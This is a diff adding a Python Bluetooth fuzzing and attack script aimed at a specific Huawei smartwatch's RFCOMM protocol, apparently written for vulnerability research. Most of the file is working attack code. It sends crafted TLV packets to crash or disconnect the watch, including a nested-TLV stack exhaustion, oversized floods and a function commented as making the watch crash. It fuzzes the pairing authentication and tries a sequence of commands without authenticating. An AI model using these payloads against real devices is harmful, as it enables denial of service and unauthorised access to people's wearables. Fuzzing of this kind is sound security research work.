@@ -1,0 +1,635 @@
+import bluetooth
+import random
+import time
+import subprocess
+import json
+import os
+
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
+from cryptography.hazmat.primitives.kdf.hkdf import *
+
+
+def byte2hexstream(b):
+    s = ""
+    for i in b:
+        s += hex(i)[2:].rjust(2, '0')
+    return s
+
+
+def send_data(s, sdata):
+    print("send:" + byte2hexstream(sdata))
+    s.send(sdata)
+    rdata = s.recv(1024)
+    print("rev:" + byte2hexstream(rdata))
+
+
+def send_data_with_rsp(payload, t):
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    print("send:" + byte2hexstream(payload))
+    s.send(payload)
+    data = s.recv(1024)
+    print("rev:" + byte2hexstream(data))
+    time.sleep(t)
+    s.close()
+
+
+def send_data_without_rsp(payload, t=0):
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    print("sid:" + str(payload[4]) + ", cid:" + str(payload[5]) + ", len:" + str(len(payload)) + " ,send:" + byte2hexstream(payload))
+
+    s.send(payload)
+    time.sleep(t)
+    s.close()
+
+
+def generate_random_data(l):
+    s = ""
+    for i in range(l):
+        s += hex(random.randint(1, 255))[2:].rjust(2, '0')
+    return bytes.fromhex(s)
+
+
+def make_packet(service_id, command_id, payload):
+    payload = b"\x00" + service_id + command_id + payload
+    return b"\x5a" + bytes.fromhex(hex(len(payload))[2:].rjust(4, "0")) + payload + b"\x41\x41"
+
+
+def make_tlv(t, payload):
+    ll = len(payload)
+    if ll > 0x80:
+        t1 = ll & 0x7f
+        t2 = (((ll & 0xff80) << 1) | 0x8000)
+        ll = t1 | t2
+        # print(hex(ll))
+        return t + bytes.fromhex(hex(ll)[2:].rjust(4, "0")) + payload
+    else:
+        return t + bytes.fromhex(hex(ll)[2:].rjust(2, "0")) + payload
+
+
+def write2file(file_name, data):
+    f = open(file_name, "wb+")
+    f.write(data)
+    f.close()
+
+
+def generate_fuzz_data(file_name):
+    p = subprocess.Popen("D:\\tools\\radamsa\\radamsa.exe " + file_name, stdout=subprocess.PIPE)
+    return p.stdout.read()
+
+
+def generate_fuzz_data1(d):
+    f = open("tmp_fuzz", "wb+")
+    f.write(d)
+    f.close()
+    fuzz_data = b""
+    while len(fuzz_data) == 0 or len(fuzz_data) > 32760:  # 2048:
+        p = subprocess.Popen("D:\\tools\\radamsa\\radamsa.exe tmp_fuzz", stdout=subprocess.PIPE)
+        fuzz_data = p.stdout.read()
+
+    return fuzz_data
+
+
+def pow_mod(B, E, M):
+    if E == 0:
+        return 1
+    elif E == 1:
+        return B % M
+    else:
+        root = pow_mod(B, E // 2, M)
+        if E % 2 == 0:
+            return (root * root) % M
+        else:
+            return (root * root * B) % M
+
+
+def discover():
+    devices = bluetooth.discover_devices(lookup_names=True)
+    for addr, name in devices:
+        print("  %s - %s" % (addr, name))
+        services = bluetooth.find_service(address=addr)
+        for service in services:
+            print("Service Name: %s" % service["name"])
+            print("    Host:        %s" % service["host"])
+            print("    Description: %s" % service["description"])
+            print("    Provided By: %s" % service["provider"])
+            print("    Protocol:    %s" % service["protocol"])
+            print("    channel/PSM: %s" % service["port"])
+            print("    svc classes: %s " % service["service-classes"])
+            print("    profiles:    %s " % service["profiles"])
+            print("    service id:  %s " % service["service-id"])
+
+    # 48:4C:86:8D:8B:D9 - HUAWEI WATCH GLL-671
+
+
+def bluez_connect(bd_addr, port):
+    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
+    sock.connect((bd_addr, port))
+    return sock
+
+
+# 5.1.1
+def connect_params_exchange():
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    data = b"\x5a\x00\x0b\x00\x01\x01\x01\x00\x02\x00\x03\x00\x04\x00\xf1\x3b\xac"
+    send_data(s, data)
+    s.close()
+
+
+def device_status_inform():
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    data = b"\x5a\x00\x05\x00\x01\x16\x01\x00\xaa\xaa\xaa"
+    send_data(s, data)
+    s.close()
+
+
+def transfer_udid():
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    data = bytes.fromhex(
+        "5a004e0001330101010540463732343845313836414543314542424643424436384635324237414432323937454145414433383535353545323035333633304331313034384536463731420301010401198522ac")
+    send_data(s, data)
+    s.close()
+
+
+def send_auth_start_request():
+    m_self_challenge = generate_random_data(16)
+    m_self_privatekey = X25519PrivateKey.generate()
+    m_self_publibckey = m_self_privatekey.public_key()
+    """
+    print(m_self_privatekey.private_bytes(
+        encoding=serialization.Encoding.Raw,
+        format=serialization.PrivateFormat.Raw,
+        encryption_algorithm=serialization.NoEncryption()
+    ))
+    print(m_self_publibckey.public_bytes(
+        encoding=serialization.Encoding.Raw,
+        format=serialization.PublicFormat.Raw
+    ))
+    """
+
+    auth_payload = {
+        "authForm": 0,
+        "message": 17,
+        "payload":
+            {
+                "challenge": byte2hexstream(m_self_challenge),
+                "epk": byte2hexstream(m_self_publibckey.public_bytes(encoding=serialization.Encoding.Raw,
+                                                                     format=serialization.PublicFormat.Raw)),
+                "pkgName": "com.huawei.health",
+                "serviceType": "HwSmartWatch",
+                "peerAuthId": "34383a34433a38363a38443a41363a3731",
+                "peerUserType": 0,
+                "keyLength": 32,
+                "support256mod": True,
+                "version":
+                    {
+                        "currentVersion": "2.0.15",
+                        "minVersion": "1.0.0"
+                    },
+                "operationCode": 2
+            }
+    }
+    auth_payload = json.dumps(auth_payload)
+    auth_payload = auth_payload.encode()
+    # print(bytes.fromhex("34383a34433a38363a38443a41363a3731").decode())
+    # print(auth_payload)
+
+    # fuzz auth_payload , pin code verify error
+    auth_payload = generate_fuzz_data1(auth_payload)
+    print(auth_payload)
+
+    # print(payload)
+    payload = make_tlv(b"\x01", auth_payload)
+    # payload = generate_fuzz_data1(payload)
+    # print(payload)
+    data = make_packet(b"\x01", b"\x28", payload)
+    # data = generate_fuzz_data1(data)
+    send_data_without_rsp(data, 0)
+
+    # print(data)
+    # print(byte2hexstream(data)[0:100])
+
+    # s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    # send_data(s, generate_fuzz_data("5.1.40.bin"))
+    # print("send:" + byte2hexstream(data))
+
+    # send_data_without_rsp(generate_fuzz_data("5.1.40.bin"), 0.5)
+
+    # s.send(data)
+    # if don't sleep(0.5) , crash of hciEventReceived occur
+    # time.sleep(0.5)
+    s.close()
+
+
+def test_tlv():
+    # tlv nested
+
+    payload = b"\xff"
+    count = 0
+    while len(payload) < 16374:
+        # print(count)
+        if count == 10965:
+            break
+        payload = make_tlv(b"\x81", payload)
+        count += 1
+
+    # tlv oom
+    """
+    payload = b""
+    while len(payload) < 32760:
+        payload += make_tlv(b"\x01", b"\xff")
+    """
+
+    payload = generate_fuzz_data1(payload)
+    data = make_packet(b"\x01", b"\x28", payload)
+    # print(byte2hexstream(data)[0:100])
+
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    print("send:" + byte2hexstream(data))
+    s.send(data)
+
+    time.sleep(1)
+    s.close()
+
+
+def my_hkdf(shared_secret, salt, info, key_length):
+    h = HKDF(algorithm=hashes.SHA256(),
+             length=32,
+             info=info,
+             salt=salt
+             )
+    prk = h._extract(shared_secret)
+
+    h = HKDFExpand(
+        algorithm=hashes.SHA256(),
+        length=32,
+        info=info
+    )
+
+    return h._expand(prk)
+
+
+def send_auth_ack_request():
+    m_peer_challenge = 0  # random(16)
+    m_peer_publickey = 0
+    m_salt = 0
+    m_pin = 0
+    BASE_INFO = b"hichain_speke_base_info"
+    secret = my_hkdf(m_pin, m_salt, BASE_INFO, 32)
+
+    MOD_POW_384 = "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74"
+    MOD_POW_384 += "020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F1437"
+    MOD_POW_384 += "4FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
+    MOD_POW_384 += "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF05"
+    MOD_POW_384 += "98DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB"
+    MOD_POW_384 += "9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"
+    MOD_POW_384 += "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF695581718"
+    MOD_POW_384 += "3995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33"
+    MOD_POW_384 += "A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7"
+    MOD_POW_384 += "ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864"
+    MOD_POW_384 += "D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E2"
+    MOD_POW_384 += "08E24FA074E5AB3143DB5BFCE0FD108E4B82D120A93AD2CAFFFFFFFFFFFFFFFF"
+
+    MOD_POW_384 = int(MOD_POW_384, 16)
+    secret = int(secret, 16)
+
+    base = pow_mod(secret, 2, MOD_POW_384)
+
+    m_self_private_param = 0  # random(32), transfer to Biginteger
+
+    m_self_public_param = pow_mod(base, m_self_private_param, MOD_POW_384)
+
+    sharedSecret = pow_mod(m_peer_publickey, m_self_private_param, MOD_POW_384)
+
+    KEY_INFO = b"hichain_speke_sessionkey_info"
+    tmp_key = my_hkdf(sharedSecret, m_salt, KEY_INFO, 16 + 32)
+
+    m_session_key = tmp_key[0:16]
+
+    m_kcf_key = tmp_key[16:32]
+
+    m_self_challenge = 0  # random()
+
+    challenge = m_self_challenge + m_peer_challenge
+
+    kcf_data = 0  # hmac(challenge)
+
+    RETURN_KEY_INFO = b"hichain_return_key"
+    aes_key = my_hkdf(m_session_key, m_salt, RETURN_KEY_INFO, 32)
+
+
+def msg_5_1_3():
+    # 5.1.3
+
+    # -1
+    """
+    payload = make_tlv(b"\x01", b"") + make_tlv(b"\x02", b"\x01") + make_tlv(b"\x03", b"\xff")
+    payload = make_packet(b"\x01", b"\x03", payload)
+    """
+
+    # stack size 1024kb
+    payload = make_tlv(b"\x01", b"") + make_tlv(b"\x02", b"\x01")
+
+    while len(payload) < 32760:
+        payload += make_tlv(b"\x03", b"\x01")
+    payload = make_packet(b"\x01", b"\x03", payload)
+
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    print("send:" + byte2hexstream(payload))
+    s.send(payload)
+    # print(s.recv(1024))
+    time.sleep(0.5)
+    s.close()
+
+
+def m_5_1_14():
+
+    payload = b""
+    while len(payload) < 32760:
+        payload += make_tlv(b"\x01", b"")
+    payload = make_packet(b"\x01", b"\x0e", payload)
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    print("send:" + byte2hexstream(payload))
+    s.send(payload)
+    # print(s.recv(1024))
+    time.sleep(5)
+    s.close()
+
+
+def m_5_1_19():
+    # first step, use this func to let watch disconnect, second use this func to let watch crash
+    payload = make_tlv(b"\x01", b"")*20 + make_tlv(b"\x02", b"")*20 + make_tlv(b"\x03", b"")*20
+
+    payload = generate_fuzz_data1(payload)
+    payload = make_packet(b"\x01", b"\x13", payload)
+
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    print("send:" + byte2hexstream(payload))
+    s.send(payload)
+    # print(s.recv(1024))
+    time.sleep(1)
+    s.close()
+
+
+def m_5_1_45():
+    payload = make_tlv(b"\x01", generate_random_data(32)) + make_tlv(b"\x02", generate_random_data(16))
+    payload = make_packet(b"\x01", b"\x2d", payload)
+    # send_data_without_rsp(payload)
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    send_data(s, payload)
+    s.close()
+
+
+def m_5_2_2():
+
+    payload = b""
+
+    while len(payload) < 100:
+        payload += make_tlv(b"\x01", b"")
+
+    payload = make_packet(b"\x02", b"\x02", payload)
+    # print(byte2hexstream(payload))
+    # send_data_without_rsp(payload, 0.5)
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    send_data(s, payload)
+    s.close()
+
+
+def m_5_40_6():
+
+    # need pre msg
+    payload = make_tlv(b"\x03", b"\x07")
+    payload = make_packet(b"\x28", b"\x02", payload)
+    # send_data_without_rsp(payload, 1)
+
+    # negativeArraySizeException -6
+    payload = make_packet(b"\x28", b"\x06", b"\x01"*3)
+    # send_data_without_rsp(payload, 1)
+
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    send_data(s, payload)
+    s.close()
+
+
+def m_5_1_51_hichian_lite():
+
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    payload = make_tlv(b"\x01", b"\x02")
+    payload = make_packet(b"\x01", b"\x33", payload)
+    send_data(s, payload)
+    s.close()
+
+
+def m_5_46_3():
+    s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+    payload = make_tlv(b"\xff", b"\xff")
+    payload = make_packet(b"\x2e", b"\x03", payload)
+    send_data(s, payload)
+    s.close()
+
+
+def do_with_out_auth():
+    # set auth type
+    m_5_1_51_hichian_lite()
+    # set key
+    m_5_1_45()
+    # test query msg
+    m_5_46_3()
+    m_5_2_2()
+    # test set msg
+    # m_5_40_6()
+
+
+def m_5_39_1():
+    payload = make_packet(b"\x27", b"\x01", b"\x01\x01\x01")
+    send_data_with_rsp(payload, 1)
+
+
+global cmd_type
+
+
+def add_cmd_type(service_id, command_id):
+    global cmd_type
+    for j in range(command_id):
+        cmd_type.append(((service_id << 16) + (j + 1)))
+
+
+def fuzz_all():
+    global cmd_type
+    cmd_type = []
+
+    add_cmd_type(1, 56)
+    add_cmd_type(2, 14)
+    add_cmd_type(3, 4)
+    add_cmd_type(4, 2)
+    # 5
+    # 6
+    add_cmd_type(7, 41)
+    add_cmd_type(8, 8)
+    add_cmd_type(9, 19)
+    add_cmd_type(10, 14)
+    add_cmd_type(11, 3)
+    add_cmd_type(12, 4)
+    # 13
+    # 14
+    add_cmd_type(15, 12)
+    # 16
+    # 17
+    # 18
+    # 19
+    # 20
+    # 21
+    add_cmd_type(22, 13)
+    add_cmd_type(23, 23)
+    add_cmd_type(24, 9)
+    add_cmd_type(25, 5)
+    add_cmd_type(26, 9)
+
+    add_cmd_type(27, 29)
+
+    add_cmd_type(28, 6)
+    add_cmd_type(29, 10)
+    # 30
+    add_cmd_type(31, 3)
+    add_cmd_type(32, 10)
+    add_cmd_type(33, 3)
+    add_cmd_type(34, 2)
+    add_cmd_type(35, 15)
+    add_cmd_type(36, 12)
+    add_cmd_type(37, 14)
+    add_cmd_type(38, 4)
+    add_cmd_type(39, 14)
+    add_cmd_type(40, 9)
+    # 41
+    add_cmd_type(42, 7)
+    add_cmd_type(43, 23)
+    add_cmd_type(44, 8)
+    add_cmd_type(45, 2)
+    add_cmd_type(46, 3)
+    # 47
+    add_cmd_type(48, 4)
+    add_cmd_type(49, 7)
+    add_cmd_type(50, 9)
+    add_cmd_type(51, 4)
+    add_cmd_type(52, 1)
+    add_cmd_type(53, 3)
+
+
+    # print(cmd_type)
+    sss = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+=/"
+    bbb = b"\x01\x02\x02\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
+    while 1:
+        for k in range(len(cmd_type)):
+            ct = random.choice(cmd_type)
+            s = bytes([ct >> 16])
+            c = bytes([ct & 0xffff])
+
+            if s[0] == 1 and c[0] == 19:
+                break
+            if s[0] == 1 and c[0] == 42:
+                break
+            if s[0] == 1 and c[0] == 8:
+                break
+            if s[0] == 44 and c[0] == 2:
+                break
+            if s[0] == 1 and c[0] == 13:
+                break
+            if s[0] == 1 and (c[0] == 47 or c[0] == 25 or c[0] == 51 or c[0] == 3):
+                break
+            if s[0] == 40 and c[0] == 2:
+                break
+            if s[0] == 53 and c[0] == 3:
+                break
+            if s[0] == 11 and c[0] == 3:
+                break
+
+            p = b""
+
+            for i in range(random.randint(10, 2000)):
+                tag = random.randint(1, 64)
+                f = random.randint(0, 2)
+                payload = b""
+                if f == 0:
+                    l = random.randint(0, 15)
+                    payload = b""
+                    for j in range(l):
+                        payload += bytes([random.randint(0, 255)])
+                if f == 1:
+                    l = random.randint(0, 15)
+                    payload = b""
+                    for j in range(l):
+                        payload += bytes([random.choice(sss)])
+                if f == 2:
+                    l = random.randint(0, 15)
+                    payload = b""
+                    for j in range(l):
+                        payload += bytes([random.choice(bbb)])
+
+                p += make_tlv( bytes([tag]), payload)
+                if len(p) > 15000:
+                    break
+            p = make_packet(s, c, p)
+            # print(s, c, len(p))
+            t = time.strftime("%Y-%m-%d-%H-%M-%S", time.localtime())
+            f = open("fuzz_data/" + str(s[0]) + "_" + str(c[0]) + "_" + t, "w+")
+            f.write(byte2hexstream(p))
+            f.close()
+            send_data_without_rsp(p, 0.5)
+
+
+def single_send():
+    fn_list = []
+    for x, y, z in os.walk("fuzz_data/"):
+        fn_list = z
+
+    for fn in fn_list:
+        try:
+            s = fn.split("-")
+            ss = s[0].split("_")[0]
+            cc = s[0].split("_")[1]
+            if s[3] == "10" and int(s[4], 10) >= 38 and ss == "27" and cc == "8":
+                print(fn)
+                f = open("fuzz_data/" + fn, "r")
+                data = f.read()
+                f.close()
+                send_data_without_rsp(bytes.fromhex(data), 0.5)
+        except:
+            pass
+
+
+def send_with_file():
+    f = open("5.52.3.txt", "r")
+    data = f.read()
+    f.close()
+
+    send_data_with_rsp(bytes.fromhex(data), 0.5)
+
+
+def m_5_7_3():
+    payload = make_tlv(b"\x02", b"\x00\x00\x00\x00")
+    payload += make_tlv(b"\x03", b"\xff\xff\xff\xff")
+    payload = make_packet(b"\x23", b"\x07", payload)
+    send_data_with_rsp(payload, 1)
+
+
+if __name__ == "__main__":
+    # s = bluez_connect("48:4C:86:8D:8B:D9", 5)
+
+    for i in range(31):
+        print(i+1)
+        try:
+            a = bluez_connect("54:0D:F9:C5:23:48", 21)
+            # a = bluez_connect("5C:3A:45:DC:C8:BA", 21)
+            print(a)
+        except OSError as e:
+            print(e)
+
+    #
+
+
+    time.sleep(999)
+
+
+
+
+
